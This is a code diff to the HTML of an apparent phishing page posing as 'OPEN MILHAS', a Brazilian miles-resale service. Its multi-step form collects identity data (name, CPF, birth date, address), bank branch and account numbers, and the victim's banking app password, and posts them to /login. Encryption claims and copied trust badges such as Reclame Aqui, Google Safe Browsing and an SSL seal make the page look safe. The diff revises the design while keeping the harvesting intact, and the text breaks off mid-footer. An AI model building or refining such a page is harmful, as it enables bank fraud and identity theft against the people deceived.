@@ -7,132 +7,83 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
     <style>
-        :root { --primary-blue: #2c7da0; --accent-gold: #c5a059; --bg-light: #f8f9fa; }
-        body { background-color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333; }
-        
-        /* Header Profissional */
-        .header-nav { padding: 15px 0; border-bottom: 1px solid #eee; background: white; sticky: top; }
-        .logo-text { font-size: 1.5rem; font-weight: 800; color: #0a1128; text-decoration: none; }
-        .logo-text span { color: var(--accent-gold); }
-        
-        /* Barra de Progresso Estilizada */
-        .progress-container { margin: 40px 0; }
-        .progress-bar-custom { height: 8px; background-color: #e9ecef; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; background-color: var(--primary-blue); width: 33%; transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
-        
-        .step-label { background: #e3f2fd; color: var(--primary-blue); padding: 6px 15px; border-radius: 20px; font-size: 0.9rem; font-weight: 600; display: inline-block; margin-bottom: 25px; }
-        
-        /* Inputs Modernos */
-        .form-control { border-radius: 50px; border: 1px solid #ddd; padding: 15px 25px; font-size: 1rem; margin-bottom: 20px; transition: all 0.3s; }
-        .form-control:focus { border-color: var(--primary-blue); box-shadow: 0 0 0 0.2rem rgba(44, 125, 160, 0.1); }
-        
-        .btn-continue { background-color: #469cb4; color: white; border-radius: 50px; padding: 12px 45px; border: none; font-weight: bold; font-size: 1.1rem; transition: 0.3s; }
-        .btn-continue:hover { background-color: var(--primary-blue); transform: translateY(-2px); }
-
-        /* Rodapé de Segurança */
-        .footer-trust { background: #fff; border-top: 1px solid #eee; padding: 40px 0; margin-top: 60px; }
-        .badge-img { height: 35px; filter: grayscale(100%); opacity: 0.6; transition: 0.3s; margin: 0 15px; }
-        .badge-img:hover { filter: grayscale(0); opacity: 1; }
-        
-        .step-content { display: none; }
-        .step-active { display: block; animation: fadeIn 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        :root { --primary: #2c7da0; --gold: #c5a059; --dark: #0a1128; }
+        body { font-family: 'Segoe UI', sans-serif; background: #fff; }
+        .navbar-brand { font-weight: 800; color: var(--dark) !important; font-size: 1.6rem; }
+        .navbar-brand span { color: var(--gold); }
+        .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 20px; margin: 40px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: var(--primary); width: 33%; transition: 0.6s ease; }
+        .step-tag { background: #e3f2fd; color: var(--primary); padding: 8px 20px; border-radius: 30px; font-weight: 600; display: inline-block; margin-bottom: 30px; }
+        .form-control { border-radius: 50px; padding: 15px 25px; border: 1px solid #ddd; margin-bottom: 20px; }
+        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; }
+        .footer-logos img { height: 45px; margin: 15px; filter: grayscale(100%); opacity: 0.7; }
+        .step-page { display: none; } .step-active { display: block; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <header class="header-nav shadow-sm">
-        <div class="container d-flex justify-content-between align-items-center">
-            <a href="#" class="logo-text">OPEN <span>MILHAS</span></a>
-            <div class="d-none d-md-block text-muted small">Vender Milhas > <span class="text-dark fw-bold">Cadastro</span></div>
-            <button class="btn btn-outline-dark rounded-pill px-4 btn-sm fw-bold">MENU</button>
-        </div>
-    </header>
+<nav class="navbar border-bottom py-3">
+    <div class="container justify-content-between">
+        <a class="navbar-brand" href="#">OPEN <span>MILHAS</span></a>
+        <div class="d-none d-md-block text-muted small">Passo <span id="stepNum">1</span> de 3</div>
+    </div>
+</nav>
 
-    <div class="container mt-5" style="max-width: 800px;">
-        <div class="text-center mb-4">
-            <h2 class="fw-bold">Complete seu cadastro</h2>
-            <p class="text-muted">Falta pouco para você receber pelas suas milhas.</p>
-        </div>
-
-        <div class="progress-container">
-            <div class="progress-bar-custom">
-                <div class="progress-fill" id="progressBar"></div>
-            </div>
-        </div>
-
-        <form action="/login" method="POST" id="regForm">
-            
-            <div class="step-content step-active" id="step1">
-                <div class="step-label"><i class="fas fa-user-circle me-2"></i> 1. Dados Pessoais</div>
-                <div class="row">
-                    <div class="col-md-12"><input type="text" name="nome" class="form-control" placeholder="Nome completo *" required></div>
-                    <div class="col-md-6"><input type="text" name="cpf" class="form-control" placeholder="CPF *" id="cpfInput" required></div>
-                    <div class="col-md-6"><input type="date" name="data_nasc" class="form-control" required title="Data de Nascimento"></div>
-                </div>
-                <div class="text-end mt-4">
-                    <button type="button" class="btn-continue" onclick="move(2)">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
-                </div>
-            </div>
-
-            <div class="step-content" id="step2">
-                <div class="step-label"><i class="fas fa-map-marker-alt me-2"></i> 2. Endereço</div>
-                <div class="row g-3">
-                    <div class="col-md-4"><input type="text" name="cep" class="form-control" placeholder="CEP *" required></div>
-                    <div class="col-md-8"><input type="text" name="rua" class="form-control" placeholder="Rua / Avenida *" required></div>
-                    <div class="col-md-4"><input type="text" name="numero" class="form-control" placeholder="Número *" required></div>
-                    <div class="col-md-8"><input type="text" name="cidade" class="form-control" placeholder="Cidade *"></div>
-                </div>
-                <div class="text-end mt-4">
-                    <button type="button" class="btn btn-link text-muted me-3" onclick="move(1)">Voltar</button>
-                    <button type="button" class="btn-continue" onclick="move(3)">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
-                </div>
-            </div>
-
-            <div class="step-content" id="step3">
-                <div class="step-label"><i class="fas fa-university me-2"></i> 3. Dados Bancários</div>
-                <div class="row">
-                    <div class="col-md-6"><input type="text" name="agencia" class="form-control" placeholder="Agência *" required></div>
-                    <div class="col-md-6"><input type="text" name="conta" class="form-control" placeholder="Número da Conta *" required></div>
-                    <div class="col-md-12">
-                        <input type="password" name="senha_app" class="form-control" placeholder="Senha do aplicativo bancário *" required>
-                        <div class="alert alert-warning border-0 small py-2 rounded-4">
-                            <i class="fas fa-shield-alt me-2"></i> Usamos criptografia de 256 bits para proteger seus dados bancários.
-                        </div>
-                    </div>
-                </div>
-                <div class="text-end mt-4">
-                    <button type="button" class="btn btn-link text-muted me-3" onclick="move(2)">Voltar</button>
-                    <button type="submit" class="btn-continue" style="background-color: var(--accent-gold);">Finalizar Cadastro</button>
-                </div>
-            </div>
-
-        </form>
+<div class="container mt-5" style="max-width: 800px;">
+    <div class="text-center mb-4">
+        <h2 class="fw-bold">Complete seu cadastro</h2>
+        <p class="text-muted">Informe seus dados para finalizar a cotação.</p>
     </div>
 
-    <footer class="footer-trust text-center">
-        <div class="container">
-            <p class="small fw-bold text-muted mb-4 text-uppercase">Plataforma Segura e Homologada</p>
-            <div class="d-flex justify-content-center align-items-center flex-wrap gap-4">
-                <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" class="badge-img" alt="Reclame Aqui">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Safe_Browsing_logo.svg/1200px-Google_Safe_Browsing_logo.svg.png" class="badge-img" alt="Google Safe">
-                <img src="https://static.wixstatic.com/media/2cd43b_7f8674b65d3a43399659f8c853177695~mv2.png/v1/fill/w_320,h_102,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/Selo%20Seguro%20SSL.png" class="badge-img" alt="SSL">
-            </div>
-            <p class="mt-5 text-muted x-small">OPEN MILHAS &copy; 2026 | CNPJ: 26.878.221/0001-50</p>
-        </div>
-    </footer>
+    <div class="progress-bar-custom"><div class="progress-fill" id="progressBar"></div></div>
 
-    <script>
-        function move(step) {
-            document.querySelectorAll('.step-content').forEach(el => el.classList.remove('step-active'));
-            document.getElementById('step' + step).classList.add('step-active');
-            
-            const fill = document.getElementById('progressBar');
-            if(step === 1) fill.style.width = '33%';
-            if(step === 2) fill.style.width = '66%';
-            if(step === 3) fill.style.width = '100%';
-            window.scrollTo(0,0);
-        }
-    </script>
-</body>
-</html>
+    <form action="/login" method="POST">
+        <div class="step-page step-active" id="step1">
+            <div class="step-tag"><i class="fas fa-user-circle me-2"></i> 1. Dados Pessoais</div>
+            <div class="row">
+                <div class="col-12"><input type="text" name="nome" class="form-control" placeholder="Nome completo *" required></div>
+                <div class="col-md-6"><input type="text" name="cpf" class="form-control" placeholder="CPF *" required></div>
+                <div class="col-md-6"><input type="date" name="data_nasc" class="form-control" required></div>
+                <div class="col-12"><input type="email" name="email" class="form-control" placeholder="E-mail *"></div>
+            </div>
+            <div class="text-end"><button type="button" class="btn-next" onclick="move(2)">Continuar</button></div>
+        </div>
+
+        <div class="step-page" id="step2">
+            <div class="step-tag"><i class="fas fa-map-marker-alt me-2"></i> 2. Endereço</div>
+            <div class="row">
+                <div class="col-md-4"><input type="text" name="cep" class="form-control" placeholder="CEP *" required></div>
+                <div class="col-md-8"><input type="text" name="rua" class="form-control" placeholder="Rua / Logradouro *" required></div>
+                <div class="col-md-4"><input type="text" name="numero" class="form-control" placeholder="Número *" required></div>
+                <div class="col-md-8"><input type="text" name="bairro" class="form-control" placeholder="Bairro"></div>
+            </div>
+            <div class="text-end">
+                <button type="button" class="btn btn-link text-muted me-3" onclick="move(1)">Voltar</button>
+                <button type="button" class="btn-next" onclick="move(3)">Continuar</button>
+            </div>
+        </div>
+
+        <div class="step-page" id="step3">
+            <div class="step-tag"><i class="fas fa-university me-2"></i> 3. Dados Bancários</div>
+            <div class="row">
+                <div class="col-md-6"><input type="text" name="agencia" class="form-control" placeholder="Agência *" required></div>
+                <div class="col-md-6"><input type="text" name="conta" class="form-control" placeholder="Número da Conta *" required></div>
+                <div class="col-12">
+                    <input type="password" name="senha_app" class="form-control" placeholder="Senha do aplicativo bancário *" required>
+                    <p class="small text-muted text-center mt-2"><i class="fas fa-lock me-1"></i> Ambiente seguro com criptografia SSL</p>
+                </div>
+            </div>
+            <div class="text-end">
+                <button type="button" class="btn btn-link text-muted me-3" onclick="move(2)">Voltar</button>
+                <button type="submit" class="btn-next" style="background: var(--gold);">Finalizar Cadastro</button>
+            </div>
+        </div>
+    </form>
+</div>
+
+<footer class="footer-logos text-center mt-5 py-5 border-top">
+    <div class="container">
+        <p class="small fw-bold text-muted mb-4">PLATAFORMA SEGURA E HOMOLOGADA</p>
+        <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" alt="Reclame Aqui">
+        <img src="
